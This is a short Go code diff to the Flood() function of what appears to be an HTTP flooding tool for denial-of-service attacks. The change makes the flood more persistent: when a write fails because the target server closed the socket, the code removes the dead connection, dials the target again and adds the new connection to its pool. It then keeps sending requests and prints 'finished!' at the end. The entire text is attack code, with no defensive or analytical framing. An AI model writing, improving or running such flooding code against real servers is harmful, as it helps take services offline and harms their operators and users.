@@ -247,6 +247,23 @@ func (flooder *HttpFlooder) Flood() {
 			n, err := conn.Write([]byte(request))
 			if err != nil {
 				print_sumthin("failed to send request!", ERROR)
+
+				// assuming that the server forcefully closed our socket
+				conn.Close()
+				for i, c := range sockets {
+					if c == conn {
+						sockets = append(sockets[:i], sockets[i+1:]...)
+						break
+					}
+				}
+
+				conn, err = net.Dial("tcp", combineHost(flooder.Host, flooder.Port))
+				if err != nil {
+					print_sumthin("failed to establish connection!", ERROR)
+					continue
+				}
+
+				sockets = append(sockets, conn)
 				continue
 			}
 			print_sumthin("Sent: "+strconv.Itoa(n), INFO)
@@ -264,4 +281,6 @@ func (flooder *HttpFlooder) Flood() {
 			continue
 		}
 	}
+
+	print_sumthin("finished!", INFO)
 }
